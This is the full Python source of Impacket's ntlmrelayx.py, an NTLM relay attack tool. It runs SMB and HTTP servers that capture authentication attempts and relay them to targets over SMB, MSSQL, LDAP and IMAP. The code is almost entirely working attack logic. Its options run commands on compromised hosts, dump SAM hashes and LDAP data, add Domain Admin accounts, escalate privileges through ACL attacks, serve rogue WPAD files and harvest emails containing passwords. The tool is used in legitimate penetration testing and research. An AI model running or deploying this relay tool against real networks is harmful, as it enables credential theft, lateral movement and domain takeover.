#!/usr/bin/env python
# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Generic NTLM Relay Module
#
# Authors:
#  Alberto Solino (@agsolino)
#  Dirk-jan Mollema / Fox-IT (https://www.fox-it.com)
#
# Description:
#             This module performs the SMB Relay attacks originally discovered
# by cDc extended to many target protocols (SMB, MSSQL, LDAP, etc).
# It receives a list of targets and for every connection received it
# will choose the next target and try to relay the credentials. Also, if
# specified, it will first to try authenticate against the client connecting
# to us.
#
# It is implemented by invoking a SMB and HTTP Server, hooking to a few
# functions and then using the specific protocol clients (e.g. SMB, LDAP).
# It is supposed to be working on any LM Compatibility level. The only way
# to stop this attack is to enforce on the server SPN checks and or signing.
#
# If the authentication against the targets succeeds, the client authentication
# succeeds as well and a valid connection is set against the local smbserver.
# It's up to the user to set up the local smbserver functionality. One option
# is to set up shares with whatever files you want to so the victim thinks it's
# connected to a valid SMB server. All that is done through the smb.conf file or
# programmatically.
#

import argparse
import sys
import logging
import cmd
import urllib2
import json
from threading import Thread

from impacket import version
from impacket.examples import logger
from impacket.examples.ntlmrelayx.servers import SMBRelayServer, HTTPRelayServer
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor, TargetsFileWatcher
from impacket.examples.ntlmrelayx.servers.socksserver import SOCKS

RELAY_SERVERS = ( SMBRelayServer, HTTPRelayServer )

class MiniShell(cmd.Cmd):
    def __init__(self, relayConfig, threads):
        cmd.Cmd.__init__(self)

        self.prompt = 'ntlmrelayx> '
        self.tid = None
        self.relayConfig = relayConfig
        self.intro = 'Type help for list of commands'
        self.relayThreads = threads
        self.serversRunning = True

    @staticmethod
    def printTable(items, header):
        colLen = []
        for i, col in enumerate(header):
            rowMaxLen = max([len(row[i]) for row in items])
            colLen.append(max(rowMaxLen, len(col)))

        outputFormat = ' '.join(['{%d:%ds} ' % (num, width) for num, width in enumerate(colLen)])

        # Print header
        print outputFormat.format(*header)
        print '  '.join(['-' * itemLen for itemLen in colLen])

        # And now the rows
        for row in items:
            print outputFormat.format(*row)

    def emptyline(self):
        pass

    def do_targets(self, line):
        for url in self.relayConfig.target.originalTargets:
            print url.geturl()
        return

    def do_socks(self, line):
        headers = ["Protocol", "Target", "Username", "Port"]
        url = "http://localhost:9090/ntlmrelayx/api/v1.0/relays"
        try:
            proxy_handler = urllib2.ProxyHandler({})
            opener = urllib2.build_opener(proxy_handler)
            response = urllib2.Request(url)
            r = opener.open(response)
            result = r.read()
            items = json.loads(result)
        except Exception, e:
            logging.error("ERROR: %s" % str(e))
        else:
            if len(items) > 0:
                self.printTable(items, header=headers)
            else:
                logging.info('No Relays Available!')

    def do_startservers(self, line):
        if not self.serversRunning:
            start_servers(options, self.relayThreads)
            self.serversRunning = True
            logging.info('Relay servers started')
        else:
            logging.error('Relay servers are already running!')

    def do_stopservers(self, line):
        if self.serversRunning:
            stop_servers(self.relayThreads)
            self.serversRunning = False
            logging.info('Relay servers stopped')
        else:
            logging.error('Relay servers are already stopped!')

    def do_exit(self, line):
        print "Shutting down, please wait!"
        return True

def start_servers(options, threads):
    for server in RELAY_SERVERS:
        #Set up config
        c = NTLMRelayxConfig()
        c.setProtocolClients(PROTOCOL_CLIENTS)
        c.setRunSocks(options.socks, socksServer)
        c.setTargets(targetSystem)
        c.setExeFile(options.e)
        c.setCommand(options.c)
        c.setEnumLocalAdmins(options.enum_local_admins)
        c.setEncoding(codec)
        c.setMode(mode)
        c.setAttacks(PROTOCOL_ATTACKS)
        c.setLootdir(options.lootdir)
        c.setOutputFile(options.output_file)
        c.setLDAPOptions(options.no_dump, options.no_da, options.no_acl, options.escalate_user)
        c.setMSSQLOptions(options.query)
        c.setInteractive(options.interactive)
        c.setIMAPOptions(options.keyword, options.mailbox, options.all, options.imap_max)
        c.setIPv6(options.ipv6)
        c.setWpadOptions(options.wpad_host, options.wpad_auth_num)
        c.setSMB2Support(options.smb2support)
        c.setInterfaceIp(options.interface_ip)


        #If the redirect option is set, configure the HTTP server to redirect targets to SMB
        if server is HTTPRelayServer and options.r is not None:
            c.setMode('REDIRECT')
            c.setRedirectHost(options.r)

        #Use target randomization if configured and the server is not SMB
        #SMB server at the moment does not properly store active targets so selecting them randomly will cause issues
        if server is not SMBRelayServer and options.random:
            c.setRandomTargets(True)

        s = server(c)
        s.start()
        threads.add(s)
    return c

def stop_servers(threads):
    todelete = []
    for thread in threads:
        if isinstance(thread, RELAY_SERVERS):
            thread.server.shutdown()
            todelete.append(thread)
    # Now remove threads from the set
    for thread in todelete:
        threads.remove(thread)
        del thread

# Process command-line arguments.
if __name__ == '__main__':

    # Init the example's logger theme
    logger.init()
    print version.BANNER
    #Parse arguments
    parser = argparse.ArgumentParser(add_help = False, description = "For every connection received, this module will "
                                    "try to relay that connection to specified target(s) system or the original client")
    parser._optionals.title = "Main options"

    #Main arguments
    parser.add_argument("-h","--help", action="help", help='show this help message and exit')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-t',"--target", action='store', metavar = 'TARGET', help='Target to relay the credentials to, '
                  'can be an IP, hostname or URL like smb://server:445 If unspecified, it will relay back to the client')
    parser.add_argument('-tf', action='store', metavar = 'TARGETSFILE', help='File that contains targets by hostname or '
                                                                             'full URL, one per line')
    parser.add_argument('-w', action='store_true', help='Watch the target file for changes and update target list '
                                                        'automatically (only valid with -tf)')
    parser.add_argument('-i','--interactive', action='store_true',help='Launch an smbclient console instead'
                        'of executing a command after a successful relay. This console will listen locally on a '
                        ' tcp port and can be reached with for example netcat.')

    # Interface address specification
    parser.add_argument('-ip','--interface-ip', action='store', metavar='INTERFACE_IP', help='IP address of interface to '
                  'bind SMB and HTTP servers',default='')

    parser.add_argument('-ra','--random', action='store_true', help='Randomize target selection (HTTP server only)')
    parser.add_argument('-r', action='store', metavar = 'SMBSERVER', help='Redirect HTTP requests to a file:// path on SMBSERVER')
    parser.add_argument('-l','--lootdir', action='store', type=str, required=False, metavar = 'LOOTDIR',default='.', help='Loot '
                    'directory in which gathered loot such as SAM dumps will be stored (default: current directory).')
    parser.add_argument('-of','--output-file', action='store',help='base output filename for encrypted hashes. Suffixes '
                                                                   'will be added for ntlm and ntlmv2')
    parser.add_argument('-codec', action='store', help='Sets encoding used (codec) from the target\'s output (default '
                                                       '"%s"). If errors are detected, run chcp.com at the target, '
                                                       'map the result with '
                                                       'https://docs.python.org/2.4/lib/standard-encodings.html and then execute ntlmrelayx.py '
                                                       'again with -codec and the corresponding codec ' % sys.getdefaultencoding())
    parser.add_argument('-smb2support', action="store_true", default=False, help='SMB2 Support (experimental!)')
    parser.add_argument('-socks', action='store_true', default=False,
                        help='Launch a SOCKS proxy for the connection relayed')
    parser.add_argument('-wh','--wpad-host', action='store',help='Enable serving a WPAD file for Proxy Authentication attack, '
                                                                   'setting the proxy host to the one supplied.')
    parser.add_argument('-wa','--wpad-auth-num', action='store',help='Prompt for authentication N times for clients without MS16-077 installed '
                                                                   'before serving a WPAD file.')
    parser.add_argument('-6','--ipv6', action='store_true',help='Listen on both IPv6 and IPv4')

    #SMB arguments
    smboptions = parser.add_argument_group("SMB client options")

    smboptions.add_argument('-e', action='store', required=False, metavar = 'FILE', help='File to execute on the target system. '
                                     'If not specified, hashes will be dumped (secretsdump.py must be in the same directory)')
    smboptions.add_argument('-c', action='store', type=str, required=False, metavar = 'COMMAND', help='Command to execute on '
                        'target system. If not specified, hashes will be dumped (secretsdump.py must be in the same '
                                                          'directory).')
    smboptions.add_argument('--enum-local-admins', action='store_true', required=False, help='If relayed user is not admin, attempt SAMR lookup to see who is (only works pre Win 10 Anniversary)')

    #MSSQL arguments
    mssqloptions = parser.add_argument_group("MSSQL client options")
    mssqloptions.add_argument('-q','--query', action='append', required=False, metavar = 'QUERY', help='MSSQL query to execute'
                        '(can specify multiple)')

    #LDAP options
    ldapoptions = parser.add_argument_group("LDAP client options")
    ldapoptions.add_argument('--no-dump', action='store_false', required=False, help='Do not attempt to dump LDAP information')
    ldapoptions.add_argument('--no-da', action='store_false', required=False, help='Do not attempt to add a Domain Admin')
    ldapoptions.add_argument('--no-acl', action='store_false', required=False, help='Disable ACL attacks')
    ldapoptions.add_argument('--escalate-user', action='store', required=False, help='Escalate privileges of this user instead of creating a new one')

    #IMAP options
    imapoptions = parser.add_argument_group("IMAP client options")
    imapoptions.add_argument('-k','--keyword', action='store', metavar="KEYWORD", required=False, default="password", help='IMAP keyword to search for. '
                        'If not specified, will search for mails containing "password"')
    imapoptions.add_argument('-m','--mailbox', action='store', metavar="MAILBOX", required=False, default="INBOX", help='Mailbox name to dump. Default: INBOX')
    imapoptions.add_argument('-a','--all', action='store_true', required=False, help='Instead of searching for keywords, '
                        'dump all emails')
    imapoptions.add_argument('-im','--imap-max', action='store',type=int, required=False,default=0, help='Max number of emails to dump '
        '(0 = unlimited, default: no limit)')

    try:
       options = parser.parse_args()
    except Exception as e:
       logging.error(str(e))
       sys.exit(1)

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.INFO)
        logging.getLogger('impacket.smbserver').setLevel(logging.ERROR)

    # Let's register the protocol clients we have
    # ToDo: Do this better somehow
    from impacket.examples.ntlmrelayx.clients import PROTOCOL_CLIENTS
    from impacket.examples.ntlmrelayx.attacks import PROTOCOL_ATTACKS


    if options.codec is not None:
        codec = options.codec
    else:
        codec = sys.getdefaultencoding()

    if options.target is not None:
        logging.info("Running in relay mode to single host")
        mode = 'RELAY'
        targetSystem = TargetsProcessor(singleTarget=options.target, protocolClients=PROTOCOL_CLIENTS)
    else:
        if options.tf is not None:
            #Targetfile specified
            logging.info("Running in relay mode to hosts in targetfile")
            targetSystem = TargetsProcessor(targetListFile=options.tf, protocolClients=PROTOCOL_CLIENTS)
            mode = 'RELAY'
        else:
            logging.info("Running in reflection mode")
            targetSystem = None
            mode = 'REFLECTION'

    if options.r is not None:
        logging.info("Running HTTP server in redirect mode")

    if targetSystem is not None and options.w:
        watchthread = TargetsFileWatcher(targetSystem)
        watchthread.start()

    threads = set()
    socksServer = None
    if options.socks is True:
        # Start a SOCKS proxy in the background
        socksServer = SOCKS()
        socksServer.daemon_threads = True
        socks_thread = Thread(target=socksServer.serve_forever)
        socks_thread.daemon = True
        socks_thread.start()
        threads.add(socks_thread)

    c = start_servers(options, threads)

    print ""
    logging.info("Servers started, waiting for connections")
    try:
        if options.socks:
            shell = MiniShell(c, threads)
            shell.cmdloop()
        else:
            sys.stdin.read()
    except KeyboardInterrupt:
        pass
    else:
        pass

    if options.socks is True:
        socksServer.shutdown()
        del socksServer

    for s in threads:
        del s

    sys.exit(0)



